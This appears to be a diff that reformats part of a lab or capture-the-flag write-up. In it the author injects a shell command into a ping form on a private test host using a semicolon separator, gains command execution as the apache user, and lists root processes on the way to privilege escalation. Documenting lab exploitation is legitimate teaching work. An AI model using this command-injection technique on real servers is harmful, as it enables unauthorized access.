@@ -236,8 +236,8 @@ Content-Type: text/html; charset=UTF-8
 
 --- 127.0.0.1 ping statistics ---
 3 packets transmitted, 3 received, 0% packet loss, time 1999ms
-rtt min/avg/max/mdev = 0.010/0.017/0.021/0.005 ms, pipe 2
-</pre>*
+rtt min/avg/max/mdev = 0.010/0.017/0.021/0.005 ms, pipe 2*
+
     The server must we running the command ping, so I try a few input validation tests to escape out of the argument and run a shell command, after a few minutes I get remote command execution with a semicolon separator:
     *POST /pingit.php HTTP/1.1
 Host: 192.168.0.11
@@ -272,9 +272,7 @@ uid=48(apache) gid=48(apache) groups=48(apache)
 </pre>*
 
     Next step is to elevent privileges to root. I run a ps command to see the processes running.
-    *
-    ...
-root      2795     1  0 03:12 ?        00:00:00 httpd
+    *root      2795     1  0 03:12 ?        00:00:00 httpd
 root      2821     1  0 03:12 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --err-log=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid
 mysql     2874  2821  0 03:12 ?        00:00:27 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock*
 
